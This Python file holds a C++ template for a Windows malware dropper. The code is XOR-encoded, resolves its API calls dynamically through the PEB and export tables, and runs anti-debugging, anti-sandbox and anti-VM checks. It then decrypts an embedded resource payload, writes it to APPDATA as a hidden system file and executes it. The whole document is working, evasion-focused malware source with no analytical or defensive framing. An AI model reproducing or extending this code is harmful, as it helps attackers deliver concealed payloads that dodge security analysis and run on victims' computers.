# Author: Nemuel Wainaina

strings = {
    # dlls
    'sKernel32': 'KERNEL32.DLL', 'sUser32': 'USER32.DLL',

    # antidebugging
    'sSetUnhandledExceptionFilter': 'SetUnhandledExceptionFilter', 'sRaiseException': 'RaiseException',

    # antisandbox
    'sLoadLibrary': 'LoadLibraryA', 'sGetSystemMetrics': 'GetSystemMetrics',
    'sGetNativeSystemInfo': 'GetNativeSystemInfo',
    'sGetPhysicallyInstalledSystemMemory': 'GetPhysicallyInstalledSystemMemory',

    # antivm
    'sIsProcessorFeaturePresent': 'IsProcessorFeaturePresent', 'sIsNativeVhdBoot': 'IsNativeVhdBoot',

    # terminate current process
    'sTerminateProcess': 'TerminateProcess', 'sGetCurrentProcess': 'GetCurrentProcess',

    # load a resource
    'sGetModuleHandle': 'GetModuleHandleA', 'sFindResource': 'FindResourceA', 'sLoadResource': 'LoadResource',
    'sLockResource': 'LockResource', 'sSizeOfResource': 'SizeOfResource',

    # dynamic memory operations
    'sGetProcAddress': 'GetProcAddress',
    'sGetProcessHeap': 'GetProcessHeap', 'sHeapAlloc': 'HeapAlloc', 'sHeapFree': 'HeapFree',

    # drop and execute the payload
    'sGetEnvironmentVariable': 'GetEnvironmentVariableA', 'sCreateFile': 'CreateFileA', 'sWriteFile': 'WriteFile',
    'sCloseHandle': 'CloseHandle', 'sSetFileAttributes': 'SetFileAttributesA', 'sCreateProcess': 'CreateProcessA',

    'payloadRsrcName': '', 'payloadDirPath': 'APPDATA', 'payloadName': ''
}

rc_file = """
"!payload!" RCDATA "payload.bin"
"""

body = """
#include <windows.h>
#include <winternl.h>

HMODULE kernel32;

typedef struct _LDR_DATA_TABLE_ENTRY_CUSTOM {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase; PVOID EntryPoint; ULONG SizeOfImage;
    UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY_CUSTOM;

template<typename T>
void XOR(T*, UINT, BOOL);
void zero_memory(void*, size_t);
template<typename T>
void* my_memcpy(T*, const T*, UINT);
void my_strcat(char*, const char*);
template<typename T>
int my_stricmp(const T*, T*, UINT);
template<typename T>
size_t my_strlen(const T*);
HMODULE get_module_base(WCHAR*, UINT);
FARPROC resolve_func_address(HMODULE, char*, UINT);
void get_resource(char*, UINT, LPCSTR, UCHAR*, ULONG*);
int antisandbox(DWORD, ULONGLONG);
int antivm();
LONG WINAPI uEFilter(PEXCEPTION_POINTERS);
void __start__(LPTOP_LEVEL_EXCEPTION_FILTER);

// xor key
UINT32 encKey = !ENCODED_KEY!;

// dll names
wchar_t sKernel32[] = !sKernel32!;
char sUser32[] = !sUser32!;

// winapi functions to get a resource
char sGetModuleHandle[] = !sGetModuleHandle!;
char sFindResource[] = !sFindResource!;
char sLoadResource[] = !sLoadResource!;
char sLockResource[] = !sLockResource!;
char sSizeOfResource[] = !sSizeOfResource!;

// winapi functions to terminate current process
char sTerminateProcess[] = !sTerminateProcess!;
char sGetCurrentProcess[] = !sGetCurrentProcess!;

// winapi functions to set an unhandled exception filter and trigger an exception (antidebugging)
char sSetUnhandledExceptionFilter[] = !sSetUnhandledExceptionFilter!;
char sRaiseException[] = !sRaiseException!;

// winapi functions for antisandbox checks
char sLoadLibrary[] = !sLoadLibrary!;
char sGetSystemMetrics[] = !sGetSystemMetrics!;
char sGetNativeSystemInfo[] = !sGetNativeSystemInfo!;
char sGetPhysicallyInstalledSystemMemory[] = !sGetPhysicallyInstalledSystemMemory!;

// winapi functions for antivm checks
char sIsProcessorFeaturePresent[] = !sIsProcessorFeaturePresent!;
char sIsNativeVhdBoot[] = !sIsNativeVhdBoot!;

// winapi functions dynamic memory operations
char sGetProcessHeap[] = !sGetProcessHeap!;
char sGetProcAddress[] = !sGetProcAddress!;
char sHeapAlloc[] = !sHeapAlloc!;
char sHeapFree[] = !sHeapFree!;

// winapi functions for shellcode execution
char sGetEnvironmentVariable[] = !sGetEnvironmentVariable!;
char sCreateFile[] = !sCreateFile!;
char sWriteFile[] = !sWriteFile!;
char sCloseHandle[] = !sCloseHandle!;
char sSetFileAttributes[] = !sSetFileAttributes!;
char sCreateProcess[] = !sCreateProcess!;

// rsrc name for the shellcode to be executed (payload)
char payloadRsrcName[] = !payloadRsrcName!;

// dir path to use for the payload drop
char payloadDirPath[] = !payloadDirPath!;
// name to use for the payload file
char payloadName[] = !payloadName!;

extern "C" void __stdcall EntryPoint() {
    kernel32 = get_module_base(sKernel32, sizeof(sKernel32)/sizeof(sKernel32[0]));

    __start__(uEFilter);
}

template<typename T>
void XOR(T* data, UINT dataLen, BOOL dataIsStr) {
    char key[4]; my_memcpy(key, (const char*) &encKey, 4);
    for (UINT i = 0; i < (dataLen - dataIsStr); i++) {
        data[i] = data[i] ^ key[i % (sizeof(key)-1)];
    }
    zero_memory(key, sizeof(key));
}

void zero_memory(void* ptr, size_t len) {
    volatile unsigned char* vptr = (volatile unsigned char*) ptr;
    while (len--) *vptr++ = 0;
}

template<typename T>
void* my_memcpy(T* dest, const T* src, UINT n) {
    for (UINT i = 0; i < n; i++) {
        dest[i] = src[i];
    }
    return dest;
}

void my_strcat(char* dest, const char* src) {
    char* ptr = dest;
    while (*ptr) ++ptr;
    while (*src) {
        *ptr++ = *src++;
    }
    *ptr = 0;
}

template<typename T>
int my_stricmp(const T* s1, T* s2, UINT s2Len) {
    int result = 0;
    T buf[30] = {0}; my_memcpy(buf, s2, s2Len);
    XOR(buf, s2Len, TRUE);
    for (UINT i = 0; i < s2Len; i++) {
        T c1 = s1[i]; T c2 = buf[i];
        if (c1 >= L'a' && c1 <= L'z') c1 -= 32;
        if (c2 >= L'a' && c2 <= L'z') c2 -= 32;

        if (c1 != c2) { result = 1; break; }
    }

    zero_memory((void*) buf, s2Len);
    return result;
}

template<typename T>
size_t my_strlen(const T* str) {
    size_t len = 0;
    while (str[len] != static_cast<T>(0)) ++len;
    return ++len;
}

// get the base address for the specified module
HMODULE get_module_base(WCHAR* moduleName, UINT moduleNameLen) {
    PEB* peb = (PEB*) __readgsqword(0x60);
    PEB_LDR_DATA* ldr = (PEB_LDR_DATA*) peb->Ldr;
    LIST_ENTRY* moduleList = &(ldr->InMemoryOrderModuleList);
    LIST_ENTRY* firstEntry = moduleList->Flink;
    LIST_ENTRY* currentEntry = firstEntry;

    do {
        LDR_DATA_TABLE_ENTRY_CUSTOM* entry = (LDR_DATA_TABLE_ENTRY_CUSTOM*) CONTAINING_RECORD(
                                                currentEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        PWSTR entryName = entry->BaseDllName.Buffer;
        if (my_stricmp(entryName, moduleName, moduleNameLen) == 0) {
            zero_memory(moduleName, moduleNameLen);
            return (HMODULE) entry->DllBase;
        }
        currentEntry = currentEntry->Flink;
    } while (currentEntry != moduleList);

    return NULL;
}

// get the base address of an exported function from a module
FARPROC resolve_func_address(HMODULE hModule, char* funcName, UINT funcNameLen) {
    IMAGE_DOS_HEADER* dosHeader = PIMAGE_DOS_HEADER(hModule);
    IMAGE_NT_HEADERS* ntHeaders = PIMAGE_NT_HEADERS64(DWORD64(hModule) + dosHeader->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exportDir = PIMAGE_EXPORT_DIRECTORY(
        DWORD64(hModule) + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    DWORD* namePointers = (DWORD*)(DWORD64(hModule) + exportDir->AddressOfNames);
    DWORD* funcPointers = (DWORD*)(DWORD64(hModule) + exportDir->AddressOfFunctions);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char* exportedName = (char*) (DWORD64(hModule) + namePointers[i]);
        if (my_stricmp(exportedName, funcName, funcNameLen) == 0) {
            zero_memory(funcName, funcNameLen);
            DWORD funcRVA = funcPointers[i];
            return (FARPROC) (DWORD64(hModule) + funcRVA);
        }
    }

    return NULL;
}

// extract resource with the provided name and type from current file
void get_resource(char* rsrcName, UINT rsrcNameLen, LPCSTR rsrcType, UCHAR** rsrcData, ULONG* rsrcSize) {
    FARPROC pGetModuleHandle, pFindResource, pLoadResource, pLockResource, pSizeOfResource;
    pGetModuleHandle = resolve_func_address(kernel32, sGetModuleHandle, sizeof(sGetModuleHandle));
    pFindResource = resolve_func_address(kernel32, sFindResource, sizeof(sFindResource));
    pLoadResource = resolve_func_address(kernel32, sLoadResource, sizeof(sLoadResource));
    pLockResource = resolve_func_address(kernel32, sLockResource, sizeof(sLockResource));
    pSizeOfResource = resolve_func_address(kernel32, sSizeOfResource, sizeof(sSizeOfResource));

    HMODULE hModule = ((HMODULE(*)(LPCSTR)) pGetModuleHandle)(NULL);
    XOR(rsrcName, rsrcNameLen, TRUE);
    HRSRC hResInfo = ((HRSRC(*)(HMODULE, LPCSTR, LPCSTR)) pFindResource)(hModule, rsrcName, rsrcType);
    zero_memory((void*) rsrcName, rsrcNameLen);
    HGLOBAL hResData = ((HGLOBAL(*)(HMODULE, HRSRC)) pLoadResource)(hModule, hResInfo);
    *rsrcData = (UCHAR*) ((LPVOID(*)(HGLOBAL)) pLockResource)(hResData);
    *rsrcSize = ((DWORD(*)(HMODULE, HRSRC)) pSizeOfResource)(hModule, hResInfo);
}

// perform antisandbox checks
int antisandbox(DWORD minNumberOfProcessors, ULONGLONG minMemoryInKilobytes) {
    FARPROC pLoadLibrary = resolve_func_address(kernel32, sLoadLibrary, sizeof(sLoadLibrary));
    XOR(sUser32, sizeof(sUser32), TRUE);
    HMODULE user32 = ((HMODULE(*)(LPCTSTR)) pLoadLibrary)(sUser32);
    zero_memory(sUser32, sizeof(sUser32));

    // check for the presence of a mouse
    FARPROC pGetSystemMetrics = resolve_func_address(user32, sGetSystemMetrics, sizeof(sGetSystemMetrics));
    int mousePresent = ((int(*)(int)) pGetSystemMetrics)(SM_MOUSEPRESENT);

    // check the number of processors
    SYSTEM_INFO sysInfo;
    FARPROC pGetNativeSystemInfo = resolve_func_address(kernel32, sGetNativeSystemInfo, sizeof(sGetNativeSystemInfo));
    ((void(*)(LPSYSTEM_INFO)) pGetNativeSystemInfo)(&sysInfo);
    DWORD numProcessors = sysInfo.dwNumberOfProcessors;

    // check the amount of RAM
    ULONGLONG ramSize;
    FARPROC pGetPhysicallyInstalledSystemMemory = resolve_func_address(
        kernel32, sGetPhysicallyInstalledSystemMemory, sizeof(sGetPhysicallyInstalledSystemMemory));
    ((WINBOOL(*)(PULONGLONG)) pGetPhysicallyInstalledSystemMemory)(&ramSize);

    return !mousePresent || (numProcessors <= minNumberOfProcessors) || (ramSize < minMemoryInKilobytes);
}

// perform antivm checks
int antivm() {
    // check if virtual firmware is enabled
    FARPROC pIsProcessorFeaturePresent = resolve_func_address(
        kernel32, sIsProcessorFeaturePresent, sizeof(sIsProcessorFeaturePresent));
    int virtFirmwareEnabled = ((WINBOOL(*)(DWORD)) pIsProcessorFeaturePresent)(PF_VIRT_FIRMWARE_ENABLED);

    // check if system booted from a virtual hard disk
    FARPROC pIsNativeVhdBoot = resolve_func_address(kernel32, sIsNativeVhdBoot, sizeof(sIsNativeVhdBoot));
    BOOL tmp; WINBOOL nativeVhdBoot = ((WINBOOL(*)(PBOOL)) pIsNativeVhdBoot)(&tmp);

    return virtFirmwareEnabled || nativeVhdBoot;
}

// write the payload to a file and execute it
void drop_and_execute(UCHAR* payload, ULONG payloadLen) {
    FARPROC pGetEnvironmentVariable, pCreateFile, pWriteFile, pCloseHandle, pSetFileAttributes, pCreateProcess;
    pGetEnvironmentVariable = resolve_func_address(kernel32, sGetEnvironmentVariable, sizeof(sGetEnvironmentVariable));
    pCreateFile = resolve_func_address(kernel32, sCreateFile, sizeof(sCreateFile));
    pWriteFile = resolve_func_address(kernel32, sWriteFile, sizeof(sWriteFile));
    pCloseHandle = resolve_func_address(kernel32, sCloseHandle, sizeof(sCloseHandle));
    pSetFileAttributes = resolve_func_address(kernel32, sSetFileAttributes, sizeof(sSetFileAttributes));
    pCreateProcess = resolve_func_address(kernel32, sCreateProcess, sizeof(sCreateProcess));

    XOR(payloadDirPath, sizeof(payloadDirPath), TRUE);
    char payloadPath[MAX_PATH] = {0};
    ((DWORD(*)(LPCTSTR, LPTSTR, DWORD)) pGetEnvironmentVariable)(payloadDirPath, payloadPath, MAX_PATH);
    zero_memory(payloadDirPath, sizeof(payloadDirPath));
    XOR(payloadName, sizeof(payloadName), TRUE);
    my_strcat(payloadPath, payloadName);
    zero_memory(payloadName, sizeof(payloadName));
    HANDLE hFile = ((HANDLE(*)(LPCTSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE)) pCreateFile)(
        payloadPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    ((BOOL(*)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED)) pWriteFile)(hFile, payload, payloadLen, NULL, NULL);
    ((BOOL(*)(HANDLE)) pCloseHandle)(hFile);
    ((BOOL(*)(LPCTSTR, DWORD)) pSetFileAttributes)(payloadPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0};
    ((BOOL(*)(LPCTSTR, LPCSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCTSTR, LPSTARTUPINFO,
        LPPROCESS_INFORMATION)) pCreateProcess)(payloadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    zero_memory(payloadPath, sizeof(payloadPath));
}

// custom top level exception handler
LONG WINAPI uEFilter(PEXCEPTION_POINTERS pExceptionPointers) {
    UCHAR *pe; ULONG peLen;
    int sandbox, vm;

    sandbox = antisandbox(1, 2*1024*1024); vm = antivm();
    if (sandbox || vm) {
        FARPROC pTerminateProcess = resolve_func_address(kernel32, sTerminateProcess, sizeof(sTerminateProcess));
        FARPROC pGetCurrentProcess = resolve_func_address(kernel32, sGetCurrentProcess, sizeof(sGetCurrentProcess));
        ((WINBOOL(*)(HANDLE, UINT)) pTerminateProcess)(((HANDLE(*)()) pGetCurrentProcess)(), 0);
    }

    // load & decode payload from resources section
    get_resource(payloadRsrcName, sizeof(payloadRsrcName), RT_RCDATA, &pe, &peLen);
    FARPROC pGetProcessHeap = resolve_func_address(kernel32, sGetProcessHeap, sizeof(sGetProcessHeap));
    FARPROC pGetProcAddress = resolve_func_address(kernel32, sGetProcAddress, sizeof(sGetProcAddress));
    XOR(sHeapAlloc, sizeof(sHeapAlloc), TRUE);
    FARPROC pHeapAlloc = ((FARPROC(*)(HMODULE, LPCSTR)) pGetProcAddress)(kernel32, sHeapAlloc);
    zero_memory(sHeapAlloc, sizeof(sHeapAlloc));
    FARPROC pHeapFree = resolve_func_address(kernel32, sHeapFree, sizeof(sHeapFree));
    UCHAR *payload = (UCHAR*) ((PVOID(*)(PVOID, ULONG, SIZE_T)) pHeapAlloc)(
        ((HANDLE(*)()) pGetProcessHeap)(), HEAP_ZERO_MEMORY, peLen);
    my_memcpy(payload, pe, peLen);
    XOR((BYTE*) payload, peLen, FALSE);

    // drop & execute the payload
    drop_and_execute(payload, peLen);
    zero_memory(payload, peLen);
    ((BOOL(*)(HANDLE, DWORD, LPVOID)) pHeapFree)(((HANDLE(*)()) pGetProcessHeap)(), HEAP_NO_SERIALIZE, payload);

    return EXCEPTION_CONTINUE_EXECUTION;
}

// antidebug check trigger
void __start__(LPTOP_LEVEL_EXCEPTION_FILTER exceptionHandler) {
    FARPROC pSetUnhandledExceptionFilter = resolve_func_address(
        kernel32, sSetUnhandledExceptionFilter, sizeof(sSetUnhandledExceptionFilter));
    FARPROC pRaiseException = resolve_func_address(kernel32, sRaiseException, sizeof(sRaiseException));
    ((LPTOP_LEVEL_EXCEPTION_FILTER(*)(LPTOP_LEVEL_EXCEPTION_FILTER)) pSetUnhandledExceptionFilter)(exceptionHandler);
    ((void(*)(DWORD, DWORD, DWORD, const ULONG_PTR*)) pRaiseException)(EXCEPTION_FLT_DIVIDE_BY_ZERO, 0, 0, NULL);
}
"""
